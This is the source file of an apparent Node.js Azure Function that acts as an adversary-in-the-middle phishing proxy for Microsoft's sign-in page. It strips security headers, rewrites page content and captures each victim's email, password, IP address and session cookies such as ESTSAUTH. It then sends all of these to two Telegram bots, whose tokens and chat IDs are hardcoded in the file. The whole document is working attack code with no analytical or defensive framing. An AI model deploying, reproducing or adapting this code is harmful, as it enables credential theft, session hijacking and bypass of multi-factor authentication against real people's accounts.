const fetch = require('node-fetch');
const upstream = "login.microsoftonline.com";
const upstream_path = "/";
const telegram_bot_token = "5609281274:AAHWsvjYauuibR_vs9MPdInpB8LzB1lJXt8";
const telegram_chat_id = "1412104349";
const telegram_bot_token_2 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const telegram_chat_id_2 = "6743632244";

// headers to delete from upstream responses
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

async function replace_response_text(response, upstream, original) {
  return response
    .text()
    .then((text) => text.replace(new RegExp(upstream, "g"), original));
}

module.exports = async function (context, req) {
  async function dispatchMessage(message) {
    context.log(message);
    
    const url1 = `https://api.telegram.org/bot${telegram_bot_token}/sendMessage`;
    const url2 = `https://api.telegram.org/bot${telegram_bot_token_2}/sendMessage`;
    
    await Promise.all([
      fetch(url1, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: telegram_chat_id,
          text: message,
          parse_mode: "HTML",
        }),
      }).catch((err) => console.error("Telegram bot 1 error:", err)),
      fetch(url2, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: telegram_chat_id_2,
          text: message,
          parse_mode: "HTML",
        }),
      }).catch((err) => console.error("Telegram bot 2 error:", err))
    ]);
  }

  // Get the original URL from the request
  const original_url = `https://${req.headers.host}${req.url}`;
  const upstream_url = new URL(original_url);
  
  // Rewriting to MSONLINE
  upstream_url.host = upstream;
  upstream_url.port = 443;
  upstream_url.protocol = "https:";

  if (upstream_url.pathname == "/") {
    upstream_url.pathname = upstream_path;
  } else {
    upstream_url.pathname = upstream_path + upstream_url.pathname;
  }

  context.log(
    `Proxying ${req.method}: ${original_url} to: ${upstream_url}`
  );

  // Create headers object manually
  const new_request_headers = {
    ...req.headers,
    "Host": upstream_url.host,
    "accept-encoding": "gzip;q=0,deflate;q=0",
    "user-agent": "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)",
    "Referer": original_url
  };

  // Get client IP
  const ip = req.headers["cf-connecting-ip"] ||
             req.headers["x-forwarded-for"] ||
             req.headers["x-real-ip"] ||
             "unknown";

  // Obtain password from POST body
  if (req.method === "POST") {
    const body = req.body;
    const keyValuePairs = body.split("&");

    // extract key-value pairs for username and password
    const msg = Object.fromEntries(
      keyValuePairs
        .map((pair) => ([key, value] = pair.split("=")))
        .filter(([key, _]) => key == "loginfmt" || key == "passwd")
        .map(([_, value]) => [
          _,
          decodeURIComponent(value.replace(/\+/g, " ")),
        ])
    );

    if (msg.loginfmt && msg.passwd) {
      await dispatchMessage(
        `📥 <b>Captured Credentials</b>:\n🧑‍💻 <b>Email</b>: ${msg.loginfmt}\n🔑 <b>Password</b>: ${msg.passwd}\n🌐 <b>IP</b>: ${ip}`
      );
    }
  }

  try {
    const original_response = await fetch(upstream_url.href, {
      method: req.method,
      headers: new_request_headers,
      body: req.method === "POST" ? req.body : undefined,
    });

    // Create response headers object manually
    const new_response_headers = { ...original_response.headers.raw() };

    // Delete headers that might cause issues
    delete_headers.forEach((header) => {
      delete new_response_headers[header];
    });

    // Check for authentication cookies
    const originalCookies = original_response.headers.get("set-cookie");
    if (originalCookies) {
      const importantCookies = originalCookies.split(",").filter((cookie) =>
        /(ESTSAUTH|ESTSAUTHPERSISTENT|SignInStateCookie|MSPOK)=/.test(cookie)
      );

      if (importantCookies.length > 0) {
        await dispatchMessage(
          `🍪 <b>Captured Cookies</b>:\n🌐 <b>IP</b>: ${ip}\n📋 <b>Cookies</b>: ${importantCookies.join(", ")}`
        );
      }
    }

    const response_text = await replace_response_text(
      original_response,
      upstream,
      req.headers.host
    );

    return {
      status: original_response.status,
      headers: new_response_headers,
      body: response_text,
    };
  } catch (error) {
    context.log.error("Error proxying request:", error);
    return {
      status: 500,
      body: "Internal Server Error"
    };
  }
};